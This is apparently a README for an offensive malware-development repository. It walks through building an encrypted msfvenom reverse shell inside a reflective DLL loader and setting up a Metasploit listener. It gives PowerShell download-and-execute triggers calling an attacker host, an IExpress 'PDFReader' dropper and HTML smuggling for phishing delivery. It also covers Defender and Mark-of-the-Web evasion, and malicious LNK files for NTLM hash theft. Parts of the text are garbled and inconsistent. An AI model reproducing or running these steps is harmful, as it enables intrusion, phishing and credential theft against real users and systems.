# ReflectiveDll

The ReflectiveDLL injection concept here was developed by Secktor7 malware development intermediate course and used plenty of code from Stephen Fewer and his repository.

I have fix some bugs on the reflectiondll code.

**Disclaimer: While reflectiondll is an old technique its possible to be catch against the new AV and XDR.**

## Origin

l0c0b0b0_!0X#$%>

## Installation

Several functions and API may need to be installed default dependencies of Windows OS, compile with Visual Studio all the files:

### Python3

aes.py requires the usage of Python3.8+ and pip, which can be installed on any Linux using the following commands:

```bash
python3 -m pip install Crypto --break-system-packages
python3 -m pip install pycryto --break-system-packages
python3 -m pip install pycryptomode --break-system-packages
```

## Usage

[1] Create payload reverse shell (binary/raw) file:

```bash
msfvenom --platform windows --arch x64  -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 EXITFUNC=thread -f raw -o revshell.bin
```

[2] Encrypt the reverse shell binary (revshell.bin) file with aes.py script:

```bash
python3 aes.py revshell.bin
OutPut:
AESkey[] = { 0x7c, 0x58, 0x12, 0xf7, 0x93, 0xad, 0x69, 0x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0x28, 0xa0, 0x55 };
payload[] = { 0x34, 0x70, 0x35, 0x11, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, 0x65, 0x9e, 0xa8, 0x5a, 0xc4, 0x49, 0x38, ....., 0x33 };
```

[3] Replace the hexadecimal payload and key into #reflectivedll/src/ReflectiveDll.c file (line:39,40), compile on Visual Studio.
(OutputFile: reflectivedll\x64\Release\cObO.x64.dll)

[4] Encrypt the cObO.x64.dll file with aes.py script:

```bash
python3 aes.py cObO.x64.dll
OutPut:
AESkey[] = { 0x1c, 0x51, 0x11, 0xa7, 0x93, 0xad, 0x69, 0x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0x28, 0xa0, 0x55 };
payload[] = { 0x11, 0x50, 0x35, 0x45, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0xf7, 0x93, 0xad, 0x69, 0x9a, ....., 0x19 };
```
[5] Reemplace the hexadecimal payload and key into #reflectiveloader/src/main.cpp file (line:140,141), compile on Visual Studio.
(OutputFile: reflectiveloader\x64\Debug\bOlO.exe)

[6] Listener C2 Metasploit

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 1234
set ExitOnSession false
exploit -j -z
```
After get a session elevate to meterpreter:

```bash
msf6 exploit/multi/handler>  session -u 1
```
[7] Trigger reflective Loader

```bash
ps> iex (new-object net.webclient).downloadstring('http://10.10.10.10:8443/tools/ex.ps1')"
```

# Triggers
# Embbeded payload to trigger a rev shell or any payload .exe. with LOLBAS.
The trigger is the file that the user will interact with after extracting the container.  You typically want this to be as 'pain-free' as possible, like a double-click.
In this stage the attacker already has a evil payload working or at least a rev shell working.

## IEXPRESS (LOLBAS)

### [00] INTRODUCTION
IExpress vulnerability described in 1.3.6.1.4.1.25623.1.0.813808. It seems the issue with IExpress is that it can create packages which can be exploited by a vulnerability in some unpacker in the wild, but IExpress in itself is not vulnerable. The problem, as I understand it, is as follows:
- IExpress creates a self-extracting program which allows files to be extracted to locations outside of the current working directory, and includes a set of instructions for executing the files once they’re extracted.
- A malicious .dll is placed in the same folder as the self-extracting archive.
When the archive is executed, it first extracts the files and then runs them as required by the onboard instructions. The problem is that when it looks for a specific file, it searches in the current working directory before it checks the absolute path specified by the instructions.
- If a malicious .dll resides in the same directory as a self-extracting archive created by IExpress, and shares a filename with one of the archived files, but not its path, that malicious .dll may be executed by the archive upon extraction.
- Injection of completes powershell commands.
- IExpress uses makecab in order to create the cab/exe files. But internally at Microsoft there is a tool called DIAMOND.EXE that act similarly to makecab (btw the DDF files that we are passing to makecab are called like that because of this. Short for DIAMOND Directive File).
- Specify a special compression type called "QUANTUM" inside the .SED file that we pass to IExpress we can make it invoke DIAMOND.EXE (which does NOT exists on modern Windows Machine) instead they use makecab.exe.

**NOTE**

>TODO: Evasion EDR/AV with Windows SandBox, mount Disk "C:" into Virtual Windows Machine and copy you evil payload (reflective.exe) to C:\Windows\System32\DIAMOND.EXE. Execute IExpress with "QUANTUM" compression and can have administrative privileges.(Ref: https://www.youtube.com/watch?v=O20WhmCspqo)
>
>In .SED file add:
>
>```xml
>[Options]
>PackagePurpose=CreateCAB
>
>...
>
>ExtractorStub=
>CompressionType=QUANTUM
>[Strings]
>
>...
>
>```


...in that way, IExpress is able to create a package that can be exploited on some far-away computer, but it does not constitute a vulnerability on the computer being scanned because it itself does not extract the package. A design flaw, definitely, but not actually something that makes the computer vulnerable.


### [01] Create a EXE file, CMD & POWERSHELL

The template [PDFReader.SED](./tools/iexpress/PDFReader.SED) it already modify to hide the process of the commands lines.
Modify you IP address and TCP port where your evil payload is hosted.

```xml
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
TargetName=C:\Users\win11\Downloads\PDFReader.EXE
FriendlyName=PDFReader
AppLaunched="cmd.exe /c powershell -c (new-object System.Net.WebClient).DownloadFile('http://ATTACKERIP:TCPPORT/evillink.lnk',[Environment]::GetFolderPath('Desktop')+'\evillink.lnk')"
PostInstallCmd="powershell -c start (iwr http://ATTACKERIP:TCPORT/EVIL.EXE | iex)"
AdminQuietInstCmd=
UserQuietInstCmd=
FILE0="calc.exe"
[SourceFiles]
```
Command line to create EXE from terminal, after creation on GUI interface

```bash
Ps C:\Users\win\Downloads> iexpress.exe /n /q PDFReader.SED
Ps C:\Users\win\Downloads> .\PDFReader.EXE
```

### [10] DELIVERY MALICIOUS EXE IN HTML SMUGGLING
HTML smuggling is a means of leveraging modern HTML5 and JavaScript features to sneak files past traditional content filters.  In old-skool phishing emails, you may see something like a button with a simple HREF.  The file itself will sit somewhere in the web root, maybe (/var/www/html/report.zip).  Then when clicked, the user's browser will perform another HTTP GET request to fetch the resource.  As it's being downloaded, scanners can see the file's content in the HTTP response.

HTML smuggling works by encoding the file in the HTML content itself and using JavaScript to decode and download it to the victim's machine.  This is a simple template based on work by Stan Hegt.

>TODO:
> - Automate the input file, replace with yours malicious payload EXE generated by [IExpress](#iexpress-lolbas)
> - Change the sysarg inputs to args.parse:
> - exe-http-name => Name how will be save the file when the victim accept to download. Default: PDFReader
> - phish-url => URL redirection, website where the victim will see to download the evil file attached.
> - output => add output name file in .html

```bash
python3 smuggling.py
Exe file name (Default => GetAdobeReader): PDFReader
Phishing URL (Default => https://get.adobe.com/flashplayer/):
Building malware binary
Converting malware binary to base64
Injecting Data URI (base64) code into page.html
```

Mark of the Web, aka MotW, is a zone identifier used to mark files that have been downloaded from the Internet as potentially unsafe.  This can be seen on a file by looking at its properties in Explorer or using PowerShell.

```bash
PS C:\Users\Attacker\Downloads> Get-Content -Stream Zone.Identifier .\test.pdf
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
HostUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
```

MotW is troublesome when phishing because Windows may present additional security warnings to the user when attempting to open or run files that have it.  Some files, such as Office documents, will not enable macros if MotW is present.

Containers provide a means of bundling your dependencies (trigger, payload, and decoy) into a single file.  This simplifies the process of sending multiple files to a victim and can add a level of obfuscation (e.g. if they can be password protected).  The ISO/IMG, ZIP, and WIM formats are solid choices as they're natively supported by Windows.  You could go for something like 7z, Gz, or WinRAR, but a victim may not have the required software available to interact with them.  You can package your files manually, or use a tool such as mgeeky's PackMyPayload.  Some of these container formats support hidden files, and some do not propagate MotW.  This [repository](https://github.com/nmantani/archiver-MOTW-support-comparison) by Nobutaka Mantani contains a comparison of MotW propagations.
Ref[PackMyPayload]: https://github.com/mgeeky/PackMyPayload


### [111] The following payloads was tested successfully against Windows Defender.

[1] [Reflective Payload](#reflectivedll): cObO.dll, bOlO.exe (windows/x64/shell_reverse_tcp)
Triggers
```bash
ps> powershell iex(new-object System.Net.WebClient).DownloadString("http://ATTACKERIP:TCPORT/bOlO.exe")
ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
```

[2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT
[`Obfuscate`](./tools/triggers/oneline.txt)
**Note:**
It can be hosted as txt on a web server or as TXT record in a DNS server.

- **Web Trigger**

```bash
ps> iwr http://domain_oneline.txt | iex
```

 - **DNS Trigger**

```bash
ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
```

[3] Leak Link NTLM Relay

[*leaklink*](./tools/leaklink/) is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
Running the python script:

```bash
~$ python3 leaklink.py --help
usage: leaklink.py [-h] [--lnk_file_path LNK_FILE_PATH] [--smb_share_path SMB_SHARE_PATH] [--description DESCRIPTION]

Create a malicious LNK file for SMB hash leakage

options:
  -h, --help            show this help message and exit
  --lnk_file_path LNK_FILE_PATH
                        Path to the LNK file to create
  --smb_share_path SMB_SHARE_PATH
                        UNC path to the malicious SMB share
  --description DESCRIPTION
                        Description text for the LNK file

~$ python3 leaklink.py --lnk_file_path evillink.lnk --smb_share_path "\\\\RESPONDERIP\\share\\noimporta.ctf" --description "Pwned!!!"
```


### Directory Tree

By default, results will be stored in the ./recon directory. A new sub directory is created for every target. The structure of this sub directory is:

```
/README.md
./reflectivedll
├── cObO.sln
├── cObO.vcproj
├── cObO.vcxproj
├── cObO.vcxproj.filters
├── cObO.vcxproj.user
└── src
    ├── ReflectiveDll.c
    ├── ReflectiveDLLInjection.h
    ├── ReflectiveLoader.c
    └── ReflectiveLoader.h
./reflectiveloader
├── bOlO.sln
├── bOlO.vcxproj
├── bOlO.vcxproj.filters
├── bOlO.vcxproj.user
└── src
    └── main.cpp
./tools
├── cipherpayload
│   └── aes.py
├── htmlsmuggling
│   ├── page.html
│   ├── payload_b64
│   ├── PDFReader.EXE
│   ├── PDFReader_First.EXE
│   ├── smuggling.py
│   ├── source.c
│   └── template.html
├── iexpress
│   ├── PDFReader.SED
│   └── readme.txt
├── leaklink
│   ├── evillink.lnk
│   ├── leaklink.py
│   ├── poc.lnk
│   └── readme.txt
└── triggers
    ├── ex.ps1
    ├── oneline.txt
    └── readme.txt
```
